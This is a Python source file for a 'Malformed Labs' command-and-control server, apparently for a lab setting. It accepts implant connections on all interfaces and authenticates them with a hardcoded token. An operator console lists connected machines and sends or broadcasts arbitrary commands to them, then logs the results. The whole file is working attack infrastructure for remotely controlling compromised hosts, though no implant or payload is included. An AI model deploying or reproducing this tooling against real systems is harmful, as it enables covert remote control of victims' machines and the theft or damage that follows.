#!/usr/bin/env python3
"""
Malformed Labs C2 Server
Basic Command and Control Server for Lab Environment
"""

import socket
import threading
import json
import time
import uuid
from datetime import datetime
import logging
import base64
import hashlib

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('c2server.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

class C2Server:
    def __init__(self, host='0.0.0.0', port=8888):
        self.host = host
        self.port = port
        self.clients = {}
        self.server_socket = None
        self.running = False
        
        # Simple authentication token (in production, use proper crypto)
        self.auth_token = "malformed_labs_2025"
        
    def start(self):
        """Start the C2 server"""
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)
            
            self.running = True
            logger.info(f"C2 Server started on {self.host}:{self.port}")
            logger.info("Waiting for client connections...")
            
            while self.running:
                try:
                    client_socket, address = self.server_socket.accept()
                    logger.info(f"New connection from {address}")
                    
                    # Handle client in separate thread
                    client_thread = threading.Thread(
                        target=self.handle_client,
                        args=(client_socket, address)
                    )
                    client_thread.daemon = True
                    client_thread.start()
                    
                except socket.error as e:
                    if self.running:
                        logger.error(f"Socket error: {e}")
                        
        except Exception as e:
            logger.error(f"Server start error: {e}")
        finally:
            self.cleanup()
    
    def handle_client(self, client_socket, address):
        """Handle individual client connection"""
        client_id = None
        try:
            # Initial handshake
            welcome_msg = {
                'type': 'handshake',
                'message': 'Malformed Labs C2 Server',
                'timestamp': datetime.now().isoformat()
            }
            self.send_message(client_socket, welcome_msg)
            
            # Wait for client authentication
            auth_response = self.receive_message(client_socket)
            if not auth_response or not self.authenticate_client(auth_response):
                logger.warning(f"Authentication failed for {address}")
                client_socket.close()
                return
            
            # Generate client ID and register
            client_id = str(uuid.uuid4())[:8]
            client_info = {
                'id': client_id,
                'address': address,
                'socket': client_socket,
                'last_seen': datetime.now(),
                'info': auth_response.get('info', {})
            }
            self.clients[client_id] = client_info
            
            logger.info(f"Client {client_id} authenticated from {address}")
            
            # Send confirmation
            auth_success = {
                'type': 'auth_success',
                'client_id': client_id,
                'message': 'Authentication successful'
            }
            self.send_message(client_socket, auth_success)
            
            # Handle client messages
            while self.running:
                message = self.receive_message(client_socket)
                if not message:
                    break
                
                self.process_client_message(client_id, message)
                self.clients[client_id]['last_seen'] = datetime.now()
                
        except Exception as e:
            logger.error(f"Client handler error for {address}: {e}")
        finally:
            if client_id and client_id in self.clients:
                del self.clients[client_id]
                logger.info(f"Client {client_id} disconnected")
            client_socket.close()
    
    def authenticate_client(self, auth_message):
        """Authenticate client connection"""
        if auth_message.get('type') != 'auth':
            return False
        
        token = auth_message.get('token')
        return token == self.auth_token
    
    def process_client_message(self, client_id, message):
        """Process incoming message from client"""
        msg_type = message.get('type')
        
        if msg_type == 'heartbeat':
            # Respond to heartbeat
            response = {
                'type': 'heartbeat_ack',
                'timestamp': datetime.now().isoformat()
            }
            self.send_to_client(client_id, response)
            
        elif msg_type == 'command_result':
            # Log command execution result
            command = message.get('command', 'unknown')
            result = message.get('result', '')
            success = message.get('success', False)
            
            logger.info(f"Client {client_id} executed '{command}': {'SUCCESS' if success else 'FAILED'}")
            logger.debug(f"Result: {result}")
            
        elif msg_type == 'info_update':
            # Update client information
            if client_id in self.clients:
                self.clients[client_id]['info'].update(message.get('info', {}))
                logger.info(f"Client {client_id} info updated")
        
        else:
            logger.warning(f"Unknown message type '{msg_type}' from client {client_id}")
    
    def send_message(self, client_socket, message):
        """Send JSON message to client"""
        try:
            data = json.dumps(message).encode('utf-8')
            length = len(data)
            client_socket.send(length.to_bytes(4, 'big'))
            client_socket.send(data)
        except Exception as e:
            logger.error(f"Send message error: {e}")
    
    def receive_message(self, client_socket):
        """Receive JSON message from client"""
        try:
            # Receive message length
            length_bytes = client_socket.recv(4)
            if len(length_bytes) != 4:
                return None
            
            length = int.from_bytes(length_bytes, 'big')
            
            # Receive message data
            data = b''
            while len(data) < length:
                chunk = client_socket.recv(length - len(data))
                if not chunk:
                    return None
                data += chunk
            
            return json.loads(data.decode('utf-8'))
        except Exception as e:
            logger.error(f"Receive message error: {e}")
            return None
    
    def send_to_client(self, client_id, message):
        """Send message to specific client"""
        if client_id in self.clients:
            client_socket = self.clients[client_id]['socket']
            self.send_message(client_socket, message)
    
    def send_command_to_client(self, client_id, command):
        """Send command to specific client"""
        message = {
            'type': 'command',
            'command': command,
            'timestamp': datetime.now().isoformat()
        }
        self.send_to_client(client_id, message)
        logger.info(f"Sent command to client {client_id}: {command}")
    
    def broadcast_command(self, command):
        """Send command to all connected clients"""
        for client_id in list(self.clients.keys()):
            self.send_command_to_client(client_id, command)
    
    def list_clients(self):
        """List all connected clients"""
        return [
            {
                'id': client_id,
                'address': str(info['address']),
                'last_seen': info['last_seen'].isoformat(),
                'info': info['info']
            }
            for client_id, info in self.clients.items()
        ]
    
    def stop(self):
        """Stop the C2 server"""
        self.running = False
        if self.server_socket:
            self.server_socket.close()
        logger.info("C2 Server stopped")
    
    def cleanup(self):
        """Cleanup resources"""
        for client_info in self.clients.values():
            try:
                client_info['socket'].close()
            except:
                pass
        self.clients.clear()

def interactive_console(server):
    """Interactive console for server management"""
    print("\n=== Malformed Labs C2 Server Console ===")
    print("Commands:")
    print("  list                    - List connected clients")
    print("  send <client_id> <cmd>  - Send command to specific client")
    print("  broadcast <cmd>         - Send command to all clients")
    print("  quit                    - Stop server")
    print("=" * 40)
    
    while server.running:
        try:
            cmd = input("\nC2> ").strip()
            if not cmd:
                continue
            
            parts = cmd.split(None, 2)
            command = parts[0].lower()
            
            if command == 'quit':
                server.stop()
                break
            
            elif command == 'list':
                clients = server.list_clients()
                if clients:
                    print(f"\nConnected Clients ({len(clients)}):")
                    for client in clients:
                        print(f"  {client['id']} - {client['address']} - Last seen: {client['last_seen']}")
                        if client['info']:
                            print(f"    Info: {client['info']}")
                else:
                    print("\nNo clients connected")
            
            elif command == 'send' and len(parts) >= 3:
                client_id = parts[1]
                command_text = parts[2]
                if client_id in server.clients:
                    server.send_command_to_client(client_id, command_text)
                    print(f"Command sent to {client_id}")
                else:
                    print(f"Client {client_id} not found")
            
            elif command == 'broadcast' and len(parts) >= 2:
                command_text = parts[1]
                server.broadcast_command(command_text)
                print("Command broadcast to all clients")
            
            else:
                print("Invalid command. Type 'quit' to exit.")
                
        except KeyboardInterrupt:
            print("\nShutting down server...")
            server.stop()
            break
        except Exception as e:
            print(f"Console error: {e}")

if __name__ == "__main__":
    server = C2Server()
    
    # Start server in background thread
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Give server time to start
    time.sleep(1)
    
    # Start interactive console
    try:
        interactive_console(server)
    except KeyboardInterrupt:
        server.stop()
    
    print("C2 Server shutdown complete.")